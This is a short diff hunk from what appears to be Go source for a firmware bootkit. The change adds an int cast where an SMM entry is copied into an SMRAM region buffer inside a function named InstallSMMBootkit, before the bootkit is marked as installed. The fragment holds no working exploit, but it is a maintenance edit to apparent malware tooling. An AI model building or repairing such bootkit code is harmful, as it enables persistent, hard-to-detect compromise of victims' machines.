@@ -43,7 +43,7 @@ func (bs *BootkitSMMEngine) InstallSMMBootkit() bool {
 	payloadOffset := smrramSize / 2
 
 	smmEntry := bs.generateSMMEntry()
-	copy(smrramRegion[payloadOffset:payloadOffset+len(smmEntry)], smmEntry)
+	copy(smrramRegion[int(payloadOffset):int(payloadOffset)+len(smmEntry)], smmEntry)
 
 	bs.SMIPayload = smrramRegion
 	bs.SMMInstalled = true
